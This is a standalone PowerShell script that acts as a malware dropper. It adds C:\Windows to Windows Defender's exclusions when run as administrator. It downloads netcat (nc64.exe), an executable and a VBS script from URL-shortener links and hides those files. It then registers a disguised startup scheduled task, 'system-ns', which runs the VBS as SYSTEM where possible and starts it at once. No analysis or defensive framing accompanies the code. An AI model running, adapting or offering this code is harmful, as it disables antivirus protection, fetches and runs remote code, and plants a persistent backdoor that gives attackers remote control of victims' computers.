# Check if the script is running as an Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Output "Running as Administrator"
    $installPath = "C:\Windows"
    $scriptVbsUrl = "https://rb.gy/w3a7hb"
    Add-MpPreference -ExclusionPath $installPath
} else {
    Write-Output "Not running as Administrator"
    $installPath = Join-Path $env:USERPROFILE "System"
    $scriptVbsUrl = "https://rb.gy/3lld2p"
}

# Create the installation directory if it doesn't exist
if (-not (Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
}

# File download paths
$quietTxtPath = Join-Path $installPath "Quiet.exe"
$nc64TxtPath = Join-Path $installPath "nc64.exe"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# URLs for files
$quietTxtUrl = "https://rb.gy/mx0i5"
$nc64TxtUrl = "https://rb.gy/guty9"

# Download files
Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath -UseBasicParsing
Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath -UseBasicParsing
Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath -UseBasicParsing

# Make downloaded files hidden
$filesToHide = @($quietTxtPath, $nc64TxtPath, $scriptVbsPath)
foreach ($file in $filesToHide) {
    attrib +H $file
}

# Verify if the script file exists before registering the task
if (-not (Test-Path $scriptVbsPath)) {
    Write-Output "Script file not found: $scriptVbsPath"
    exit
}

# Create a scheduled task
$action = New-ScheduledTaskAction -Execute $scriptVbsPath
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd

try {
    $taskName = "system-ns"

    if ($isAdmin) {
        # Admin rights - run as SYSTEM
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
    } else {
        # Non-admin - use current user's context
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Settings $settings -Force
    }

    # Start the task immediately after registration
    Start-ScheduledTask -TaskName $taskName

} catch {
    Write-Output "Failed to register or start the scheduled task: $_"
}
